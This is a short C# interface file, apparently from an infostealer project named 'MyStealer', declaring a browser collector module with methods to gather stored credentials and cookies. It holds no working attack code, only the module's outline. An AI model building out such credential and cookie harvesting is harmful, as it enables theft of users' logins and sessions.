using System.Collections.Generic;

namespace MyStealer.Modules.Browser
{
    internal interface IBrowserCollector : IModule
    {
        ISet<CredentialEntry> GetCredentials();
        ISet<CookieEntry> GetCookies();
    }
}
